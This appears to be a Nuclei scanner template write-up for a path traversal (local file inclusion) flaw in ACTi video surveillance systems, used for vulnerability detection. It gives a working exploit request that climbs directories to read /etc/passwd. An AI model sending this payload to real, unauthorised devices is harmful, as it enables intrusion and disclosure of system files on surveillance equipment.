# Nuclei Template: ACTi-Video Monitoring - Local File Inclusion
**Template ID:** acti-video-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`acti-video-lfi.yaml`)

## Vulnerability Information & PoC

## Description
ACTI video surveillance has loopholes in reading any files

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/images/../../../../../../../../etc/passwd
```

## References
- https://www.cnblogs.com/hmesed/p/16292252.html
